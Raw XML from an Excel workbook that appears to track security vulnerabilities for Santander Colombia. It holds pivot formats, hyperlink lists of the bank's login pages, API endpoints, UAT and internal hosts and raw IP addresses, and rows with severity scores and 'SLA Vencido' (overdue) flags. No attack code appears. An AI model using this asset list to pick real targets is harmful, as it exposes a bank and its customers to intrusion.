        <references count="1">
          <reference field="9" count="5">
            <x v="12"/>
            <x v="80"/>
            <x v="117"/>
            <x v="121"/>
            <x v="135"/>
          </reference>
        </references>
      </pivotArea>
    </format>
    <format dxfId="33">
      <pivotArea collapsedLevelsAreSubtotals="1" fieldPosition="0">
        <references count="1">
          <reference field="9" count="5">
            <x v="12"/>
            <x v="80"/>
            <x v="117"/>
            <x v="121"/>
            <x v="135"/>
          </reference>
        </references>
      </pivotArea>
    </format>
    <format dxfId="32">
      <pivotArea collapsedLevelsAreSubtotals="1" fieldPosition="0">
        <references count="1">
          <reference field="9" count="5">
            <x v="12"/>
            <x v="80"/>
            <x v="117"/>
            <x v="121"/>
            <x v="135"/>
          </reference>
        </references>
      </pivotArea>
    </format>
  </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santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.santander.com.co/recursos/archivos/," TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://servicios.santander.com.co/PortalDeInformacion/customer/v1/customer/customerInformationByOperation?operation=ID_CREDITO" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com/" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://uat.invoway.com/action/generarCredencialesCliente" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://servicios.santander.com.co/webclient/Login.xhtml" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://servicios.santander.com.co/webclient/Login.xhtml" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://uat.invoway.com/action/verificarClaveCliente" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/comments" Target="../comments1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.santander.com.co/Empresas/" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com/" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vmlDrawing" Target="../drawings/vmlDrawing1.vml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://181.57.221.233/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.inittab.org/administracion-sistemas/dnssec-asegurando-las-respuestas-de-nuestro-dominio-la-practica-ii/" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://prospera.santanderconsumer.co/" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.santander.com.co/README.md" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://181.57.221.233/esg/vinculation-form?email_token=%3ctoken%3e" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/printerSettings" Target="../printerSettings/printerSettings1.bin"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/"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3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId26" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.santander.com.co/recursos/archivos/," TargetMode="External"/><Relationship Id="rId21" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/" TargetMode="External"/><Relationship Id="rId34" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://servicios.santander.com.co/PortalDeInformacion/customer/v1/customer/customerInformationByOperation?operation=ID_CREDITO" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId25" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com/" TargetMode="External"/><Relationship Id="rId33" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://uat.invoway.com/action/generarCredencialesCliente" TargetMode="External"/><Relationship Id="rId38" Type="http://schemas.microsoft.com/office/2019/04/relationships/namedSheetView" Target="../namedSheetViews/namedSheetView1.xml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId29" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://servicios.santander.com.co/webclient/Login.xhtml" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId24" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://servicios.santander.com.co/webclient/Login.xhtml" TargetMode="External"/><Relationship Id="rId32" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://uat.invoway.com/action/verificarClaveCliente" TargetMode="External"/><Relationship Id="rId37" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/comments" Target="../comments2.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId23" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.santander.com.co/Empresas/" TargetMode="External"/><Relationship Id="rId28" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com/" TargetMode="External"/><Relationship Id="rId36" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vmlDrawing" Target="../drawings/vmlDrawing2.vml"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId31" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://181.57.221.233/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://blog.inittab.org/administracion-sistemas/dnssec-asegurando-las-respuestas-de-nuestro-dominio-la-practica-ii/" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId22" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://prospera.santanderconsumer.co/" TargetMode="External"/><Relationship Id="rId27" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.santander.com.co/README.md" TargetMode="External"/><Relationship Id="rId30" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://181.57.221.233/esg/vinculation-form?email_token=%3ctoken%3e" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/printerSettings" Target="../printerSettings/printerSettings2.bin"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/Web/Login.aspx?ReturnUrl=%2FWeb%2F" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santander.com.co/"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8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://experiencia.santanderconsumer.co/credito-vehiculo-prepago" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/comments" Target="../comments3.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://sccfc22ga.cocf.pre.corp/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://experiencia.santanderconsumer.co/clientes_tesla" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vmlDrawing" Target="../drawings/vmlDrawing3.vml"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://64.76.176.202/factoring/index.seam" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://santanderfinancing.com/wp-content/plugins/divi-machine/ChangeLog" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://experiencia.santanderconsumer.co/credito-vehiculo-prepago" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://bpm.santanderconsumer.co/OriginacionPROD/Api/Authentication/BizagiConfig" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.santanderconsumer.co/" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://experiencia.santanderconsumer.co/clientes_tesla" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://64.76.89.146:9090/factoring" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://experiencia.santanderconsumer.co/credito-vehiculo-prepago" TargetMode="External"/><Relationship Id="rId14"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8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://bpm.santanderconsumer.co/" TargetMode="External"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://recidvw.olimpiait.com/" TargetMode="External"/><Relationship Id="rId18" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.prodb.mb.cdt.santander.com.co/" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://bpm.premiercredit.co:8000/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://mft.santanderconsumer.co/webclient/Login.xhtml" TargetMode="External"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://recidaw.olimpiait.com/" TargetMode="External"/><Relationship Id="rId17" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.cdt.santander.com.co/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://confirming-factoring.santander.com.co/" TargetMode="External"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.santanderfinancing.com/" TargetMode="External"/><Relationship Id="rId20" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/printerSettings" Target="../printerSettings/printerSettings3.bin"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://confirming.santander.com.co/" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://clienteacces0.santanderconsumer.co/remote/login?lang=en" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://recidam.olimpiait.com/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://tucarro.santanderconsumer.co/" TargetMode="External"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.santander.com.co/" TargetMode="External"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://consola.reconoserid.com/" TargetMode="External"/><Relationship Id="rId19" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://servicios.santander.com.co/webclient/Login.xhtml" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://soporte.premiercredit.co/" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://tucarro.premiercredit.co:12443/" TargetMode="External"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://portalrecaudo-santandercolombia-uat.noprd.e-pagos.cl/" TargetMode="Externa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DBADF-860B-49EE-9A3A-DAB2239BD046}">
  <sheetPr filterMode="1"/>
  <dimension ref="A1:AH621"/>
  <sheetViews>
    <sheetView zoomScale="55" zoomScaleNormal="55" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A527" activePane="bottomLeft" state="frozen"/>
      <selection pane="bottomLeft" activeCell="D527" sqref="D527"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="10" defaultColWidth="11.453125" defaultRowHeight="14.5" x14ac:dyDescent="0.35"/>
  <cols>
    <col min="1" max="1" width="6.54296875" bestFit="1" customWidth="1"/>
    <col min="2" max="2" width="13.81640625" bestFit="1" customWidth="1"/>
    <col min="3" max="3" width="19.81640625" bestFit="1" customWidth="1"/>
    <col min="4" max="4" width="22.7265625" customWidth="1"/>
    <col min="5" max="5" width="42.54296875" customWidth="1"/>
    <col min="6" max="6" width="31.7265625" customWidth="1"/>
    <col min="7" max="7" width="51.54296875" customWidth="1"/>
    <col min="8" max="9" width="53.1796875" customWidth="1"/>
    <col min="10" max="10" width="104.54296875" customWidth="1"/>
    <col min="11" max="11" width="75.453125" customWidth="1"/>
    <col min="12" max="12" width="12.54296875" customWidth="1"/>
    <col min="13" max="13" width="12.453125" customWidth="1"/>
    <col min="14" max="14" width="13.81640625" customWidth="1"/>
    <col min="15" max="15" width="32.453125" style="26" customWidth="1"/>
    <col min="16" max="16" width="28.26953125" customWidth="1"/>
    <col min="17" max="17" width="56.26953125" customWidth="1"/>
    <col min="18" max="18" width="9.26953125" customWidth="1"/>
    <col min="19" max="19" width="14" customWidth="1"/>
    <col min="20" max="21" width="21.7265625" customWidth="1"/>
    <col min="22" max="22" width="45.1796875" style="1" customWidth="1"/>
    <col min="23" max="23" width="45.1796875" customWidth="1"/>
    <col min="24" max="25" width="21.7265625" customWidth="1"/>
    <col min="26" max="26" width="23" customWidth="1"/>
    <col min="27" max="27" width="21.7265625" customWidth="1"/>
    <col min="28" max="28" width="80.81640625" customWidth="1"/>
    <col min="29" max="29" width="102" customWidth="1"/>
    <col min="30" max="30" width="132.453125" customWidth="1"/>
    <col min="31" max="31" width="41.7265625" customWidth="1"/>
    <col min="32" max="32" width="42.453125" customWidth="1"/>
    <col min="33" max="33" width="45.453125" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:34" s="88" customFormat="1" ht="44.25" customHeight="1" x14ac:dyDescent="0.35">
      <c r="A1" s="2" t="s">
        <v>0</v>
      </c>
      <c r="B1" s="2" t="s">
        <v>1</v>
      </c>
      <c r="C1" s="2" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="2" t="s">
        <v>3</v>
      </c>
      <c r="E1" s="2" t="s">
        <v>4</v>
      </c>
      <c r="F1" s="2" t="s">
        <v>5</v>
      </c>
      <c r="G1" s="2" t="s">
        <v>6</v>
      </c>
      <c r="H1" s="2" t="s">
        <v>7</v>
      </c>
      <c r="I1" s="2" t="s">
        <v>8</v>
      </c>
      <c r="J1" s="2" t="s">
        <v>2043</v>
      </c>
      <c r="K1" s="3" t="s">
        <v>9</v>
      </c>
      <c r="L1" s="2" t="s">
        <v>10</v>
      </c>
      <c r="M1" s="2" t="s">
        <v>11</v>
      </c>
      <c r="N1" s="3" t="s">
        <v>12</v>
      </c>
      <c r="O1" s="3" t="s">
        <v>13</v>
      </c>
      <c r="P1" s="2" t="s">
        <v>14</v>
      </c>
      <c r="Q1" s="2" t="s">
        <v>15</v>
      </c>
      <c r="R1" s="2" t="s">
        <v>16</v>
      </c>
      <c r="S1" s="2" t="s">
        <v>17</v>
      </c>
      <c r="T1" s="2" t="s">
        <v>18</v>
      </c>
      <c r="U1" s="2" t="s">
        <v>19</v>
      </c>
      <c r="V1" s="15" t="s">
        <v>20</v>
      </c>
      <c r="W1" s="2" t="s">
        <v>21</v>
      </c>
      <c r="X1" s="2" t="s">
        <v>22</v>
      </c>
      <c r="Y1" s="3" t="s">
        <v>23</v>
      </c>
      <c r="Z1" s="2" t="s">
        <v>24</v>
      </c>
      <c r="AA1" s="3" t="s">
        <v>25</v>
      </c>
      <c r="AB1" s="3" t="s">
        <v>26</v>
      </c>
      <c r="AC1" s="3" t="s">
        <v>27</v>
      </c>
      <c r="AD1" s="2" t="s">
        <v>28</v>
      </c>
      <c r="AE1" s="2" t="s">
        <v>29</v>
      </c>
      <c r="AF1" s="2" t="s">
        <v>30</v>
      </c>
      <c r="AG1" s="38" t="s">
        <v>31</v>
      </c>
    </row>
    <row r="2" spans="1:34" ht="58" hidden="1" x14ac:dyDescent="0.35">
      <c r="A2" s="5">
        <v>1</v>
      </c>
      <c r="B2" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C2" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D2" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E2" s="4" t="s">
        <v>35</v>
      </c>
      <c r="F2" s="9" t="s">
        <v>36</v>
      </c>
      <c r="G2" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H2" s="4" t="s">
        <v>38</v>
      </c>
      <c r="I2" s="4" t="s">
        <v>39</v>
      </c>
      <c r="J2" s="4" t="s">
        <v>40</v>
      </c>
      <c r="K2" s="4"/>
      <c r="L2" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M2" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N2" s="7">
        <v>7.6999998092651367</v>
      </c>
      <c r="O2" s="6"/>
      <c r="P2" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q2" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R2" s="4">
        <v>443</v>
      </c>
      <c r="S2" s="22"/>
      <c r="T2" s="8">
        <v>42941</v>
      </c>
      <c r="U2" s="11">
        <f t="shared" ref="U2:U65" ca="1" si="0">TODAY()-T2</f>
        <v>3268</v>
      </c>
      <c r="V2" s="8">
        <f t="shared" ref="V2:V65" si="1">IF(M2="Critical",T2+10,IF(M2="High",T2+30,IF(M2="Bad",T2+30,IF(M2="Medium",T2+90,IF(M2="Warm",T2+90,IF(M2="Low",T2+120,IF(M2="Fair",T2+120,IF(M2="Neutral",T2+120,""))))))))</f>
        <v>42951</v>
      </c>
      <c r="W2" s="12" t="str">
        <f t="shared" ref="W2:W65" ca="1" si="2">IF(M2="Critical",IF(U2&gt;10,"SLA Vencido","En SLA"),IF(M2="High",IF(U2&gt;30,"SLA Vencido","En SLA"),IF(M2="Bad",IF(U2&gt;30,"SLA Vencido","En SLA"),IF(M2="Medium",IF(U2&gt;90,"SLA Vencido","En SLA"),IF(M2="Warm",IF(U2&gt;90,"SLA Vencido","En SLA"),IF(M2="Low",IF(U2&gt;120,"SLA Vencido","En SLA"),IF(M2="Fair",IF(U2&gt;120,"SLA Vencido","En SLA"),IF(M2="Neutral",IF(U2&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X2" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y2" s="30" t="s">
        <v>45</v>
      </c>
      <c r="Z2" s="30" t="s">
        <v>46</v>
      </c>
      <c r="AA2" s="8">
        <v>44025</v>
      </c>
      <c r="AB2" s="4"/>
      <c r="AC2" s="4"/>
      <c r="AD2" s="32" t="s">
        <v>47</v>
      </c>
      <c r="AE2" s="27">
        <v>44012</v>
      </c>
      <c r="AF2" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG2" s="27"/>
      <c r="AH2" t="str">
        <f>IFERROR(VLOOKUP(H2,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="3" spans="1:34" ht="159.5" hidden="1" x14ac:dyDescent="0.35">
      <c r="A3" s="5">
        <v>2</v>
      </c>
      <c r="B3" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C3" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D3" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E3" s="4" t="s">
        <v>49</v>
      </c>
      <c r="F3" s="4" t="s">
        <v>50</v>
      </c>
      <c r="G3" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H3" s="4" t="s">
        <v>51</v>
      </c>
      <c r="I3" s="4" t="s">
        <v>52</v>
      </c>
      <c r="J3" s="4" t="s">
        <v>53</v>
      </c>
      <c r="K3" s="4"/>
      <c r="L3" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M3" s="5" t="s">
        <v>42</v>
      </c>
      <c r="N3" s="7">
        <v>7.5999999046325684</v>
      </c>
      <c r="O3" s="6"/>
      <c r="P3" s="4" t="s">
        <v>43</v>
      </c>
      <c r="Q3" s="4" t="s">
        <v>44</v>
      </c>
      <c r="R3" s="4">
        <v>443</v>
      </c>
      <c r="S3" s="22"/>
      <c r="T3" s="8">
        <v>42941</v>
      </c>
      <c r="U3" s="11">
        <f t="shared" ca="1" si="0"/>
        <v>3268</v>
      </c>
      <c r="V3" s="8">
        <f t="shared" si="1"/>
        <v>42951</v>
      </c>
      <c r="W3" s="12" t="str">
        <f t="shared" ca="1" si="2"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X3" s="12" t="s">
        <v>22</v>
      </c>
      <c r="Y3" s="30" t="s">
        <v>54</v>
      </c>
      <c r="Z3" s="30" t="s">
        <v>55</v>
      </c>
      <c r="AA3" s="8">
        <v>44025</v>
      </c>
      <c r="AB3" s="4"/>
      <c r="AC3" s="4"/>
      <c r="AD3" s="32" t="s">
        <v>56</v>
      </c>
      <c r="AE3" s="27">
        <v>44012</v>
      </c>
      <c r="AF3" s="9" t="s">
        <v>48</v>
      </c>
      <c r="AG3" s="27"/>
      <c r="AH3" t="str">
        <f>IFERROR(VLOOKUP(H3,hoja1!A:A,1,),"N/A")</f>
        <v>N/A</v>
      </c>
    </row>
    <row r="4" spans="1:34" ht="29" hidden="1" x14ac:dyDescent="0.35">
      <c r="A4" s="5">
        <v>3</v>
      </c>
      <c r="B4" s="5" t="s">
        <v>32</v>
      </c>
      <c r="C4" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D4" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E4" s="4" t="s">
        <v>57</v>
      </c>
      <c r="F4" s="4"/>
      <c r="G4" s="6" t="s">
        <v>37</v>
      </c>
      <c r="H4" s="4" t="s">
        <v>58</v>
      </c>
      <c r="I4" s="4" t="s">
        <v>59</v>
      </c>
      <c r="J4" s="4" t="s">
        <v>60</v>
      </c>
      <c r="K4" s="4"/>
      <c r="L4" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M4" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N4" s="7">
        <v>6.5</v>
      </c>
      <c r="O4" s="6"/>
      <c r="P4" s="4" t="s">
